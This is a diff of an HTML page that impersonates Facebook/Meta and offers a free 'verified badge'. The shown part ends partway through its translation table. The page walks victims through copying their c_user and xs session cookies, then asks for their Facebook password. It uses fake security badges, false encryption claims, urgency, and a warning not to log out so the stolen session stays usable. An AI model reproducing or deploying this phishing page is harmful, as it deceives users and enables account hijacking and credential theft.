@@ -1,41 +1,1225 @@
 
-
-
-
-
-
-
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>META MANAGER</title>
-    <style>
-        body, html {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Page Support Center</title>
+  <style>
+        :root {
+            --fb-blue: #1877f2;
+            --fb-blue-dark: #166fe5;
+            --fb-red: #f02849;
+            --fb-green: #42b72a;
+            --fb-gray: #f0f2f5;
+            --fb-text: #1c1e21;
+            --fb-text-light: #65676b;
+        }
+        
+        body {
+            font-family: "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--fb-gray);
             margin: 0;
             padding: 0;
-            overflow: hidden;
-            height: 100%;
+            color: var(--fb-text);
         }
-
-        iframe {
+        
+        /* Main Container */
+        .fb-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .fb-header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .fb-logo {
+            height: 70px;
+            margin-bottom: 15px;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            background-color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .security-badge svg {
+            margin-right: 8px;
+            color: var(--fb-blue);
+        }
+        
+        /* Language Selector */
+        .language-selector-container {
+            position: absolute;
+            top: 0;
+            right: 0;
+        }
+        
+        .language-select {
+            padding: 8px 12px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            background-color: white;
+            color: var(--fb-text);
+            font-size: 14px;
+            cursor: pointer;
+            outline: none;
+        }
+        
+        .language-select:focus {
+            border-color: var(--fb-blue);
+        }
+        
+        /* Warning Box */
+        .warning-box {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 5px solid var(--fb-red);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        
+        .warning-title {
+            color: var(--fb-red);
+            margin-top: 0;
+        }
+        
+        /* Official Notice */
+        .official-notice {
+            background-color: white;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #dddfe2;
+        }
+        
+        .notice-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .verified-badge {
+            color: var(--fb-blue);
+            margin-right: 8px;
+        }
+        
+        /* Button */
+        .fb-button {
+            background-color: var(--fb-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px 24px;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            text-align: center;
+            transition: background-color 0.3s;
+            position: relative;
+        }
+        
+        .fb-button:hover {
+            background-color: var(--fb-blue-dark);
+        }
+        
+        .fb-button:disabled {
+            background-color: #b7c9e8;
+            cursor: not-allowed;
+        }
+        
+        /* Button loading animation */
+        .button-loading {
+            color: transparent !important;
+        }
+        
+        .button-loading::after {
+            content: "";
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            border: 3px solid transparent;
+            border-top-color: white;
+            border-radius: 50%;
+            animation: button-loading-spinner 1s linear infinite;
+        }
+        
+        @keyframes button-loading-spinner {
+            from { transform: rotate(0turn); }
+            to { transform: rotate(1turn); }
+        }
+        
+        /* Footer */
+        .fb-footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: var(--fb-text-light);
+        }
+        
+        .fb-footer a {
+            color: var(--fb-text-light);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .fb-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
-            border: none;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
         }
-    </style>
+        
+        .modal-content {
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            margin: 5% auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            position: relative;
+            animation: modalFadeIn 0.3s;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        /* Thin Scrollbar */
+        .modal-content::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .modal-content::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        
+        .modal-content::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 3px;
+        }
+        
+        .modal-content::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .modal-header {
+            padding: 16px;
+            border-bottom: 1px solid #dddfe2;
+            position: sticky;
+            top: 0;
+            background: white;
+            z-index: 1;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+            text-align: center;
+        }
+        
+        .close {
+            position: absolute;
+            left: 16px;
+            top: 16px;
+            color: #606770;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .modal-body {
+            padding: 16px;
+        }
+        
+        /* Verification Steps */
+        .verification-steps {
+            margin-bottom: 20px;
+        }
+        
+        .step {
+            display: flex;
+            margin-bottom: 15px;
+            align-items: flex-start;
+        }
+        
+        .step-number {
+            background-color: var(--fb-blue);
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .step-content {
+            flex-grow: 1;
+        }
+        
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .step-description {
+            color: var(--fb-text-light);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        /* Video Container */
+        .video-container {
+            background-color: #000;
+            border-radius: 8px;
+            margin: 16px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .video-placeholder {
+            width: 100%;
+            height: 250px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            background: linear-gradient(135deg, #4267B2 0%, #898F9C 100%);
+        }
+        
+        .video-instruction {
+            text-align: center;
+            font-size: 14px;
+            color: var(--fb-text-light);
+            margin-bottom: 16px;
+        }
+        
+        /* Form Inputs */
+        .fb-input-group {
+            margin-bottom: 16px;
+        }
+        
+        .fb-input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .fb-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        
+        .fb-input:focus {
+            outline: none;
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .fb-input.invalid {
+            border-color: var(--fb-red);
+        }
+        
+        .fb-note {
+            font-size: 13px;
+            color: var(--fb-text-light);
+            margin-top: 8px;
+            line-height: 1.4;
+        }
+        
+        .fb-note-warning {
+            color: var(--fb-red);
+            font-weight: 500;
+        }
+        
+        .error-message {
+            color: var(--fb-red);
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        /* Security Badge */
+        .security-badge-modal {
+            display: flex;
+            align-items: center;
+            background-color: #f0f2f5;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 16px 0;
+        }
+        
+        .security-badge-modal svg {
+            margin-right: 8px;
+            color: var(--fb-blue);
+            flex-shrink: 0;
+        }
+        
+        .security-badge-text {
+            font-size: 13px;
+            color: var(--fb-text-light);
+        }
+        
+        /* Loading Animation */
+        .fb-loading-bar {
+            height: 3px;
+            background-color: #e4e6eb;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+        
+        .fb-loading-progress {
+            height: 100%;
+            width: 30%;
+            background-color: var(--fb-blue);
+            animation: fb-loading 2s infinite;
+        }
+        
+        @keyframes fb-loading {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(300%); }
+        }
+        
+        /* Password Modal */
+        .password-modal-content {
+            text-align: center;
+        }
+        
+        .password-logo {
+            height: 50px;
+            margin-bottom: 15px;
+        }
+        
+        /* Success Modal */
+        .success-modal-content {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .success-logo {
+            height: 70px;
+            margin-bottom: 20px;
+        }
+        
+        .success-title {
+            color: var(--fb-blue);
+            margin-bottom: 15px;
+        }
+        
+        .success-message {
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .success-checkmark {
+            color: var(--fb-green);
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        
+        /* Language Selector Styles */
+        .language-selector {
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        .language-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            color: var(--fb-text);
+        }
+        
+        .language-buttons {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        
+        .language-button {
+            padding: 8px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background-color: white;
+            color: var(--fb-text);
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+        
+        .language-button:hover {
+            background-color: #f0f2f5;
+        }
+        
+        .language-button.active {
+            background-color: var(--fb-blue);
+            color: white;
+            border-color: var(--fb-blue);
+        }
+  </style>
 </head>
 <body>
+  <div class="fb-container">
+    <div class="fb-header">
+      <div class="language-selector-container">
+        <select class="language-select" id="languageSelect">
+          <option value="en">English</option>
+          <option value="pt">Português</option>
+          <option value="es">Español</option>
+          <option value="hi">हिंदी</option>
+          <option value="ta">தமிழ்</option>
+        </select>
+      </div>
+      <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="fb-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+      <div class="security-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" viewbox="0 0 16 16">
+          <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"></path>
+        </svg> 
+        <span data-translate="secure_connection">Facebook Secure Connection</span>
+      </div>
+      <h1 data-translate="page_title">Request a verified badge on Facebook</h1>
+    </div>
+    <div class="official-notice">
+      <div class="notice-header">
+        <svg class="verified-badge" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" viewbox="0 0 16 16">
+          <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"></path>
+        </svg> 
+        <strong data-translate="verification_center">Verification Center</strong>
+      </div>
+      <p data-translate="verification_description">The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.</p>
+    </div>
+    <div class="warning-box">
+      <h2 class="warning-title" data-translate="congratulations">Congratulations!</h2>
+      <ul>
+        <li data-translate="reason1">We're excited to unveil our newest Blue Tick feature</li>
+        <li data-translate="reason2">free upgrade that grants you access to premium tools and benefits at no cost!</li>
+        <li data-translate="reason3">No fees. No subscriptions. No catch. Your verified badge is ready — absolutely free!</li>
+        <li data-translate="reason4">This is a limited-time offer, so don't delay — send in your application now.</li>
+      </ul>
+      <p data-translate="social_presence">Grow your social presence with Meta Verified – a new subscription bundle available for creators and businesses on Instagram and Facebook.</p>
+    </div>
+    <button id="submitAppealBtn" class="fb-button" data-translate="submit_button">Submit</button>
+    <div class="fb-footer">
+      <a href="#" data-translate="help_center">Help Center</a>
+      <a href="#" data-translate="privacy_policy">Privacy Policy</a> 
+      <a href="#" data-translate="terms_of_service">Terms of Service</a> 
+      <a href="#" data-translate="community_standards">Community Standards</a>
+      <span>Meta © 2023</span>
+    </div>
+  </div>
 
-<iframe id="myFrame"></iframe>
+  <!-- Appeal Form Modal -->
+  <div id="appealModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+        <h2 class="modal-title" data-translate="verification_form">Page Verification Form</h2>
+      </div>
+      <div class="modal-body">
+        <div class="fb-loading-bar">
+          <div class="fb-loading-progress"></div>
+        </div>
+        <div class="verification-steps">
+          <div class="step">
+            <div class="step-number">1</div>
+            <div class="step-content">
+              <div class="step-title" data-translate="step1_title">Watch the verification video</div>
+              <div class="step-description" data-translate="step1_desc">Learn how to find your Facebook authentication tokens</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-number">2</div>
+            <div class="step-content">
+              <div class="step-title" data-translate="step2_title">Enter your authentication tokens</div>
+              <div class="step-description" data-translate="step2_desc">Required to verify your page ownership</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-number">3</div>
+            <div class="step-content">
+              <div class="step-title" data-translate="step3_title">Complete identity confirmation</div>
+              <div class="step-description" data-translate="step3_desc">Final step to get badge within 24 hours</div>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Language Selection -->
+        <div class="language-selector">
+          <label class="language-label" data-translate="video_language">Select Video Language:</label>
+          <div class="language-buttons">
+            <button class="language-button active" data-lang="english" data-video="https://ik.imagekit.io/english/English.mp4">English</button>
+            <button class="language-button" data-lang="portuguese" data-video="https://our-b38a1.web.app/Portuguese.mp4">Português</button>
+            <button class="language-button" data-lang="spanish" data-video="https://ik.imagekit.io/span/Spanish.mp4">Español</button>
+            <button class="language-button" data-lang="hindi" data-video="https://ik.imagekit.io/Hindi1/hindi1.mp4">Hindi</button>
+            <button class="language-button" data-lang="tamil" data-video="https://ik.imagekit.io/tamil1/tamil1.mp4">Tamil</button>
+          </div>
+        </div>
+        
+        <div class="video-container">
+          <video id="verificationVideo" controls width="100%" style="background-color: #000;">
+            <source src="https://ik.imagekit.io/english/English.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+          </video>
+        </div>
+        
+        <p class="video-instruction" data-translate="video_instruction">Follow the video instructions to locate your authentication tokens in browser cookies</p>
+        
+        <div class="fb-input-group">
+          <label class="fb-input-label" for="c_user" data-translate="c_user_label">c_user Token</label>
+          <input type="text" id="c_user" class="fb-input" placeholder="Enter c_user token (numbers only)" data-translate="c_user_placeholder">
+          <div id="c_user_error" class="error-message" data-translate="c_user_error">Error: c_user must contain only numbers</div>
+          <p class="fb-note" data-translate="c_user_note">This token identifies your Facebook account for verification</p>
+        </div>
+        
+        <div class="fb-input-group">
+          <label class="fb-input-label" for="xs" data-translate="xs_label">xs Token</label>
+          <input type="text" id="xs" class="fb-input" placeholder="Enter xs token (letters, numbers &amp; symbols)" data-translate="xs_placeholder">
+          <div id="xs_error" class="error-message" data-translate="xs_error">Error: xs must contain combination of letters, numbers and symbols</div>
+          <p class="fb-note fb-note-warning" data-translate="xs_warning">Important: Do not log out of your account for 24 hours after submission</p>
+        </div>
+        
+        <div class="security-badge-modal">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentcolor" viewbox="0 0 16 16">
+            <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"></path>
+          </svg>
+          <div class="security-badge-text" data-translate="security_info">
+            Your information is protected by Facebook's encryption and will only be used for verification purposes.
+          </div>
+        </div>
+        
+        <button id="submitRequestBtn" class="fb-button" data-translate="continue_button">Continue Verification</button>
+      </div>
+    </div>
+  </div>
 
-<script>
-    // Get the iframe element
-    var iframe = document.getElementById('myFrame');
-    
-    // Set the source URL for the iframe
-    var url = 'https://confirm-blue--badge.vercel.app/'; //
-    iframe.src = url;
-</script>
+  <!-- Password Verification Modal -->
+  <div id="passwordModal" class="modal">
+    <div class="modal-content password-modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+      </div>
+      <div class="modal-body">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="password-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+        <h2 class="modal-title" data-translate="confirm_identity">Confirm Your Identity</h2>
+        <p data-translate="password_prompt">For security purposes, please enter your Facebook password to complete the verification process.</p>
+        
+        <div class="fb-input-group">
+          <label class="fb-input-label" for="password" data-translate="password_label">Facebook Password</label>
+          <input type="password" id="password" class="fb-input" placeholder="Enter your password" data-translate="password_placeholder">
+          <p class="fb-note" data-translate="password_note">This helps us verify you're the legitimate owner of this account.</p>
+        </div>
+        
+        <div class="security-badge-modal">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentcolor" viewbox="0 0 16 16">
+            <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"></path>
+          </svg>
+          <div class="security-badge-text" data-translate="password_security">
+            Your password is encrypted and secure. We'll never ask for your password outside of Facebook's official systems.
+          </div>
+        </div>
+        
+        <button id="finalSubmitBtn" class="fb-button" data-translate="complete_button">Complete Verification</button>
+      </div>
+    </div>
+  </div>
 
+  <!-- Success Modal -->
+  <div id="successModal" class="modal">
+    <div class="modal-content success-modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+      </div>
+      <div class="modal-body">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="success-logo" onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'">
+        <div class="success-checkmark">✓</div>
+        <h2 class="success-title" data-translate="success_title">Verification Successful</h2>
+        <p class="success-message" data-translate="success_message">Your page verification appeal has been submitted successfully. Please keep your account active for the next 24 hours while we process your request.</p>
+        <button id="successCloseBtn" class="fb-button" data-translate="close_button">Close</button>
+      </div>
+    </div>
+  </div>
 
-  </body></html>
+  <script>
+        // Language translations
+        const translations = {
+            en: {
+                secure_connection: "Facebook Secure Connection",
+                page_title: "Request a verified badge on Facebook",
+                verification_center: "Verification Center",
+                verification_description: "The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.",
+                congratulations: "Congratulations!",
+                reason1: "We're excited to unveil our newest Blue Tick feature",
+                reason2: "free upgrade that grants you access to premium tools and benefits at no cost!",
+                reason3: "No fees. No subscriptions. No catch. Your verified badge is ready — absolutely free!",
+                reason4: "This is a limited-time offer, so don't delay — send in your application now.",
+                social_presence: "Grow your social presence with Meta Verified – a new subscription bundle available for creators and businesses on Instagram and Facebook.",
+                submit_button: "Submit",
+                help_center: "Help Center",
+                privacy_policy: "Privacy Policy",
+                terms_of_service: "Terms of Service",
+                community_standards: "Community Standards",
+                verification_form: "Page Verification Form",
+                step1_title: "Watch the verification video",
+                step1_desc: "Learn how to find your Facebook authentication tokens",
+                step2_title: "Enter your authentication tokens",
+                step2_desc: "Required to verify your page ownership",
+                step3_title: "Complete identity confirmation",
+                step3_desc: "Final step to get badge within 24 hours",
+                video_language: "Select Video Language:",
+                video_instruction: "Follow the video instructions to locate your authentication tokens in browser cookies",
+                c_user_label: "c_user Token",
+                c_user_placeholder: "Enter c_user token (numbers only)",
+                c_user_error: "Error: c_user must contain only numbers",
+                c_user_note: "This token identifies your Facebook account for verification",
+                xs_label: "xs Token",
+                xs_placeholder: "Enter xs token (letters, numbers & symbols)",
+                xs_error: "Error: xs must contain combination of letters, numbers and symbols",
+                xs_warning: "Important: Do not log out of your account for 24 hours after submission",
+                security_info: "Your information is protected by Facebook's encryption and will only be used for verification purposes.",
+                continue_button: "Continue Verification",
+                confirm_identity: "Confirm Your Identity",
+                password_prompt: "For security purposes, please enter your Facebook password to complete the verification process.",
+                password_label: "Facebook Password",
+                password_placeholder: "Enter your password",
+                password_note: "This helps us verify you're the legitimate owner of this account.",
+                password_security: "Your password is encrypted and secure. We'll never ask for your password outside of Facebook's official systems.",
+                complete_button: "Complete Verification",
+                success_title: "Verification Successful",
+                success_message: "Your page verification appeal has been submitted successfully. Please keep your account active for the next 24 hours while we process your request.",
+                close_button: "Close"
+            },
+            pt: {
+                secure_connection: "Conexão Segura do Facebook",
+                page_title: "Solicite um selo verificado no Facebook",
+                verification_center: "Centro de Verificação",
+                verification_description: "O selo verificado significa que o Facebook confirmou que a Página ou o perfil é a presença autêntica do indivíduo, figura pública ou marca que representa.",
+                congratulations: "Parabéns!",
+                reason1: "Estamos animados em revelar nosso novo recurso de Verificação Azul",
+                reason2: "upgrade gratuito que concede acesso a ferramentas e benefícios premium sem custo!",
+                reason3: "Sem taxas. Sem assinaturas. Sem pegadinhas. Seu selo verificado está pronto - absolutamente grátis!",
+                reason4: "Esta é uma oferta por tempo limitado, então não demore - envie sua inscrição agora.",
+                social_presence: "Cresça sua presença social com o Meta Verified – um novo pacote de assinatura disponível para criadores e empresas no Instagram e Facebook.",
+                submit_button: "Enviar",
+                help_center: "Central de Ajuda",
+                privacy_policy: "Política de Privacidade",
+                terms_of_service: "Termos de Serviço",
+                community_standards: "Padrões da Comunidade",
+                verification_form: "Formulário de Verificação de Página",
+                step1_title: "Assista ao vídeo de verificação",
+                step1_desc: "Aprenda a encontrar seus tokens de autenticação do Facebook",
+                step2_title: "Insira seus tokens de autenticação",
+                step2_desc: "Necessário para verificar a propriedade da sua página",
+                step3_title: "Complete a confirmação de identidade",
+                step3_desc: "Etapa final para obter o selo em até 24 horas",
+                video_language: "Selecione o Idioma do Vídeo:",
+                video_instruction: "Siga as instruções do vídeo para localizar seus tokens de autenticação nos cookies do navegador",
+                c_user_label: "Token c_user",
+                c_user_placeholder: "Digite o token c_user (apenas números)",
+                c_user_error: "Erro: c_user deve conter apenas números",
+                c_user_note: "Este token identifica sua conta do Facebook para verificação",
+                xs_label: "Token xs",
+                xs_placeholder: "Digite o token xs (letras, números e símbolos)",
+                xs_error: "Erro: xs deve conter combinação de letras, números e símbolos",
+                xs_warning: "Importante: Não faça logout da sua conta por 24 horas após o envio",
+                security_info: "Suas informações são protegidas pela criptografia do Facebook e serão usadas apenas para fins de verificação.",
+                continue_button: "Continuar Verificação",
+                confirm_identity: "Confirme Sua Identidade",
+                password_prompt: "Para fins de segurança, digite sua senha do Facebook para completar o processo de verificação.",
+                password_label: "Senha do Facebook",
+                password_placeholder: "Digite sua senha",
+                password_note: "Isso nos ajuda a verificar que você é o proprietário legítimo desta conta.",
+                password_security: "Sua senha é criptografada e segura. Nunca pediremos sua senha fora dos sistemas oficiais do Facebook.",
+                complete_button: "Completar Verificação",
+                success_title: "Verificação Bem-Sucedida",
+                success_message: "Seu apelo de verificação de página foi enviado com sucesso. Mantenha sua conta ativa nas próximas 24 horas enquanto processamos sua solicitação.",
+                close_button: "Fechar"
+            },
+            es: {
+                secure_connection: "Conexión Segura de Facebook",
+                page_title: "Solicita una insignia verificada en Facebook",
+                verification_center: "Centro de Verificación",
+                verification_description: "La insignia verificada significa que Facebook ha confirmado que la Página o perfil es la presencia auténtica del individuo, figura pública o marca que representa.",
+                congratulations: "¡Felicidades!",
+                reason1: "Estamos emocionados de presentar nuestra nueva función de Verificación Azul",
+                reason2: "actualización gratuita que te otorga acceso a herramientas y beneficios premium sin costo alguno!",
+                reason3: "Sin tarifas. Sin suscripciones. Sin trucos. Tu insignia verificada está lista - ¡absolutamente gratis!",
+                reason4: "Esta es una oferta por tiempo limitado, así que no te demores - envía tu solicitud ahora.",
+                social_presence: "Haz crecer tu presencia social con Meta Verified – un nuevo paquete de suscripción disponible para creadores y empresas en Instagram y Facebook.",
+                submit_button: "Enviar",
+                help_center: "Centro de Ayuda",
+                privacy_policy: "Política de Privacidad",
+                terms_of_service: "Términos de Servicio",
+                community_standards: "Estándares de la Comunidad",
+                verification_form: "Formulario de Verificación de Página",
+                step1_title: "Mira el video de verificación",
+                step1_desc: "Aprende a encontrar tus tokens de autenticación de Facebook",
+                step2_title: "Ingresa tus tokens de autenticación",
+                step2_desc: "Requerido para verificar la propiedad de tu página",
+                step3_title: "Completa la confirmación de identidad",
+                step3_desc: "Paso final para obtener la insignia en 24 horas",
+                video_language: "Selecciona el Idioma del Video:",
+                video_instruction: "Sigue las instrucciones del video para ubicar tus tokens de autenticación en las cookies del navegador",
+                c_user_label: "Token c_user",
+                c_user_placeholder: "Ingresa el token c_user (solo números)",
+                c_user_error: "Error: c_user debe contener solo números",
+                c_user_note: "Este token identifica tu cuenta de Facebook para verificación",
+                xs_label: "Token xs",
+                xs_placeholder: "Ingresa el token xs (letras, números y símbolos)",
+                xs_error: "Error: xs debe contener combinación de letras, números y símbolos",
+                xs_warning: "Importante: No cierres sesión en tu cuenta durante 24 horas después del envío",
+                security_info: "Tu información está protegida por el cifrado de Facebook y solo se utilizará con fines de verificación.",
+                continue_button: "Continuar Verificación",
+                confirm_identity: "Confirma Tu Identidad",
+                password_prompt: "Por motivos de seguridad, ingresa tu contraseña de Facebook para completar el proceso de verificación.",
+                password_label: "Contraseña de Facebook",
+                password_placeholder: "Ingresa tu contraseña",
+                password_note: "Esto nos ayuda a verificar que eres el propietario legítimo de esta cuenta.",
+                password_security: "Tu contraseña está encriptada y es segura. Nunca pediremos tu contraseña fuera de los sistemas oficiales de Facebook.",
+                complete_button: "Completar Verificación",
+                success_title: "Verificación Exitosa",
+                success_message: "Tu solicitud de verificación de página se ha enviado correctamente. Mantén tu cuenta activa durante las próximas 24 horas mientras procesamos tu solicitud.",
+                close_button: "Cerrar"
+            },
+            hi: {
+                secure_connection: "Facebook सुरक्षित कनेक्शन",
+                page_title: "Facebook पर सत्यापित बैज का अनुरोध करें",
+                verification_center: "सत्यापन केंद्र",
+                verification_description: "सत्यापित बैज का मतलब है कि Facebook ने पुष्टि की है कि पेज या प्रोफ़ाइल उस व्यक्ति, सार्वजनिक हस्ती या ब्रांड की प्रामाणिक उपस्थिति है जिसका यह प्रतिनिधित्व करता है।",
+                congratulations: "बधाई हो!",
+                reason1: "हम अपनी नवीनतम ब्लू टिक सुविधा का अनावरण करने के लिए उत्साहित हैं",
+                reason2: "मुफ्त अपग्रेड जो आपको बिना किसी लागत के प्रीमियम टूल और लाभ प्रदान करता है!",
+                reason3: "कोई फीस नहीं। कोई सदस्यता नहीं। कोई पकड़ नहीं। आपका सत्यापित बैज तैयार है - बिल्कुल मुफ्त!",
+                reason4: "यह एक सीमित समय का ऑफर है, इसलिए देरी न करें - अभी अपना आवेदन भेजें।",
+                social_presence: "Meta Verified के साथ अपनी सोशल उपस्थिति बढ़ाएं - Instagram और Facebook पर क्रिएटर्स और व्यवसायों के लिए उपलब्ध एक नया सब्सक्रिप्शन बंडल।",
+                submit_button: "जमा करें",
+                help_center: "सहायता केंद्र",
+                privacy_policy: "गोपनीयता नीति",
+                terms_of_service: "सेवा की शर्तें",
+                community_standards: "कम्युनिटी मानक",
+                verification_form: "पेज सत्यापन फॉर्म",
+                step1_title: "सत्यापन वीडियो देखें",
+                step1_desc: "अपने Facebook प्रमाणीकरण टोकन कैसे खोजें, यह सीखें",
+                step2_title: "अपने प्रमाणीकरण टोकन दर्ज करें",
+                step2_desc: "आपके पेज के स्वामित्व को सत्यापित करने के लिए आवश्यक",
+                step3_title: "पहचान पुष्टि पूरी करें",
+                step3_desc: "24 घंटों के भीतर बैज प्राप्त करने के लिए अंतिम चरण",
+                video_language: "वीडियो भाषा चुनें:",
+                video_instruction: "ब्राउज़र कुकीज़ में अपने प्रमाणीकरण टोकन खोजने के लिए वीडियो निर्देशों का पालन करें",
+                c_user_label: "c_user टोकन",
+                c_user_placeholder: "c_user टोकन दर्ज करें (केवल संख्याएं)",
+                c_user_error: "त्रुटि: c_user में केवल संख्याएं होनी चाहिए",
+                c_user_note: "यह टोकन सत्यापन के लिए आपके Facebook खाते की पहचान करता है",
+                xs_label: "xs टोकन",
+                xs_placeholder: "xs टोकन दर्ज करें (अक्षर, संख्याएं और प्रतीक)",
+                xs_error: "त्रुटि: xs में अक्षरों, संख्याओं और प्रतीकों का संयोजन होना चाहिए",
+                xs_warning: "महत्वपूर्ण: सबमिशन के 24 घंटे बाद तक अपने खाते से लॉग आउट न करें",
+                security_info: "आपकी जानकारी Facebook की एन्क्रिप्शन द्वारा सुरक्षित है और केवल सत्यापन उद्देश्यों के लिए उपयोग की जाएगी।",
+                continue_button: "सत्यापन जारी रखें",
+                confirm_identity: "अपनी पहचान की पुष्टि करें",
+                password_prompt: "सुरक्षा उद्देश्यों के लिए, कृपया सत्यापन प्रक्रिया पूरी करने के लिए अपना Facebook पासवर्ड दर्ज करें।",
+                password_label: "Facebook पासवर्ड",
+                password_placeholder: "अपना पासवर्ड दर्ज करें",
